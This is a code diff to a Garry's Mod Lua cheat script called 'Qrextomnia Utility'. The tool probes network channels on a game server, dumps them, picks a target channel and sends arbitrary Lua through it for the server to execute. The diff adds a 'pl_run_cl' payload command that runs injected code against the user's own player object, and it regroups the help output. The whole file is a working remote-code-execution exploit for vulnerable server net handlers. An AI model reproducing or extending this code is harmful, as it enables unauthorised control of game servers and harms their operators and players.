@@ -1,6 +1,6 @@
-
 local prefix = "qrex"
 local channel = ""
+local lPlayer = LocalPlayer():SteamID64()
 local vulChannel = {}
 local commands = {}
 local groups = {}
@@ -13,7 +13,6 @@ end
 
 local function checkChannel(str)
 local status = pcall(net.Start, str)
-
 return status
 end
 
@@ -50,6 +49,17 @@ if(!args[1]) then return end
 	net.SendToServer()
 end
 
+local function luaRunOnLocal(ply, cmd, args)
+if(!args[1]) then return end
+  local arg1 = args[1]
+  local arg1 = string.Trim(arg1)
+  net.Start(channel)
+	net.WriteString([[player.GetBySteamID("]]..tostring(lPlayer)..[["):]]..arg1)
+	net.SendToServer()
+
+  print("player.GetBySteamID64('"..lPlayer.."'):"..arg1)
+end
+
 local function setTarget(ply, cmd, args)
 if(!args[1]) then return end
   local arg1 = args[1]
@@ -63,25 +73,32 @@ else
 end
 
 local function help()
-for k, v in pairs(commands) do
-  MsgC(Color(255,255,255), v.name.." - ",Color(155, 155, 155), v.description.."\n")
-end
+for k, v in pairs(groups) do
+  MsgC(Color(255,255,255), v..": \n")
+    for _, q in pairs(commands) do
+      if(q.group == v) then
+        MsgC(Color(255,255,255), q.name.." - ",Color(155, 155, 155), q.description.."\n")
+      end
+    end
+    Msg("\n")
+  end
 end
 
 local function init()
-MsgC(Color(255, 255, 255), "Qrextomnia Utility has successfully initialized!\n")
-
+MsgC(Color(255, 255, 255), "Qrextomnia Utility has successfully initialized!\nType "..prefix.."_help for a list of commands")
 
 addCommand("printtable", "Test command", "Utility" ,function() PrintTable(groups) end)
 addCommand("help", "Shows you a list of commands and their description.", "Help", help)
-addCommand("pl_intensescan", "Launches an intense scan on the server (This can be risky).", "Payload", intenseScan)
-addCommand("pl_lua_run", "Sends function to selected channel.", "Payload", luaRun)
+addCommand("pl_intensescan", "Launches an intense sca n on the server (This can be risky).", "Payload", intenseScan)
+addCommand("pl_run", "Sends function to selected channel.", "Payload", luaRun)
+addCommand("pl_run_cl", "Sends function to selected channel but targets you.", "Payload", luaRunOnLocal)
 addCommand("util_dump", "Dump all the networking channels in a nice neat list.", "Utility", dumpNet)
 addCommand("util_target", "Sets the target channel (Takes 1 argument).", "Utility", setTarget)
 
 for k, v in pairs(commands) do
   groups[v.group] = v.group
 end
+
 table.Reverse(commands)
 end
 
